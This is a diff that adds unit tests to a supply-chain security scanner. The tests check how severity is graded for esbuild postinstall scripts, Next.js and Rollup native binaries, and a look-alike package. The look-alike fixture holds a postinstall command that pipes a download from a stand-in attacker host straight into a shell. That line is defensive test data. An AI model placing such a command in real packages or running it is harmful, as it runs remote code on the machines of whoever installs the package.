@@ -187,6 +187,120 @@ describe('supplyChainScanner', () => {
     });
   });
 
+  // v0.13: Next.js / Rollup / esbuild platform-native packages + postinstall
+  // are ecosystem-inherent — emit findings at info severity so they appear
+  // in the report (pedagogy) but don't deduct from the score.
+  describe('ecosystem-inherent severity downgrade', () => {
+    it('emits esbuild postinstall at INFO severity (ecosystem-inherent)', async () => {
+      const nodeModules = join(tempDir, 'node_modules');
+      const esbuildPkg = join(nodeModules, 'esbuild');
+      mkdirSync(esbuildPkg, { recursive: true });
+      writeFileSync(join(esbuildPkg, 'package.json'), JSON.stringify({
+        name: 'esbuild',
+        scripts: { postinstall: 'node install.js' },
+      }));
+
+      mockReadFileSafe.mockImplementation((filePath: string) => {
+        if (filePath === join(tempDir, 'package.json')) {
+          return JSON.stringify({ dependencies: { 'esbuild': '^0.25.0' } });
+        }
+        try {
+          const { readFileSync } = require('node:fs');
+          return readFileSync(filePath, 'utf-8');
+        } catch {
+          return null;
+        }
+      });
+
+      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
+      const installFinding = result.findings.find(
+        (f) => f.title.includes('Install script') && f.title.includes('esbuild'),
+      );
+      expect(installFinding).toBeDefined();
+      expect(installFinding!.severity).toBe('info');
+      expect(installFinding!.description).toContain('Ecosystem-inherent');
+    });
+
+    it('emits @next/swc-* native binaries at INFO severity (ecosystem-inherent)', async () => {
+      const nodeModules = join(tempDir, 'node_modules');
+      const swcPkg = join(nodeModules, '@next', 'swc-darwin-arm64');
+      mkdirSync(swcPkg, { recursive: true });
+      writeFileSync(join(swcPkg, 'next-swc.darwin-arm64.node'), 'binary content');
+
+      mockReadFileSafe.mockImplementation((filePath: string) => {
+        if (filePath === join(tempDir, 'package.json')) {
+          return JSON.stringify({ dependencies: {} });
+        }
+        return null;
+      });
+
+      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
+      const swcFinding = result.findings.find(
+        (f) => f.title.includes('Native binary') && f.title.includes('@next/swc-darwin-arm64'),
+      );
+      expect(swcFinding).toBeDefined();
+      expect(swcFinding!.severity).toBe('info');
+      expect(swcFinding!.description).toContain('Ecosystem-inherent');
+    });
+
+    it('emits @rollup/rollup-* native binaries at INFO severity (ecosystem-inherent)', async () => {
+      const nodeModules = join(tempDir, 'node_modules');
+      const rollupPkg = join(nodeModules, '@rollup', 'rollup-linux-x64-gnu');
+      mkdirSync(rollupPkg, { recursive: true });
+      writeFileSync(join(rollupPkg, 'rollup.linux-x64-gnu.node'), 'binary content');
+
+      mockReadFileSafe.mockImplementation((filePath: string) => {
+        if (filePath === join(tempDir, 'package.json')) {
+          return JSON.stringify({ dependencies: {} });
+        }
+        return null;
+      });
+
+      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
+      const rollupFinding = result.findings.find(
+        (f) => f.title.includes('Native binary') && f.title.includes('@rollup/rollup-linux-x64-gnu'),
+      );
+      expect(rollupFinding).toBeDefined();
+      expect(rollupFinding!.severity).toBe('info');
+    });
+
+    // Threat-model Pass-2: ensure the downgrade is pattern-specific.
+    // A random package with a postinstall + .node binary must still
+    // emit at MEDIUM — the ecosystem-inherent carve-out is not a
+    // blanket allowlist.
+    it('still emits MEDIUM for non-ecosystem packages with postinstall or native binaries', async () => {
+      const nodeModules = join(tempDir, 'node_modules');
+      const sneaky = join(nodeModules, 'totally-not-esbuild');
+      mkdirSync(sneaky, { recursive: true });
+      writeFileSync(join(sneaky, 'package.json'), JSON.stringify({
+        name: 'totally-not-esbuild',
+        scripts: { postinstall: 'curl http://evil.example | sh' },
+      }));
+      writeFileSync(join(sneaky, 'stealth.node'), 'binary content');
+
+      mockReadFileSafe.mockImplementation((filePath: string) => {
+        if (filePath === join(tempDir, 'package.json')) {
+          return JSON.stringify({ dependencies: { 'totally-not-esbuild': '1.0.0' } });
+        }
+        try {
+          const { readFileSync } = require('node:fs');
+          return readFileSync(filePath, 'utf-8');
+        } catch {
+          return null;
+        }
+      });
+
+      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
+      const hostileFindings = result.findings.filter(
+        (f) => f.title.includes('totally-not-esbuild'),
+      );
+      expect(hostileFindings.length).toBeGreaterThanOrEqual(2);
+      for (const f of hostileFindings) {
+        expect(f.severity).toBe('medium');
+      }
+    });
+  });
+
   // --- Check 6: Phantom Dependencies ---
   describe('phantom dependency detection', () => {
     it('detects imported packages not in package.json', async () => {
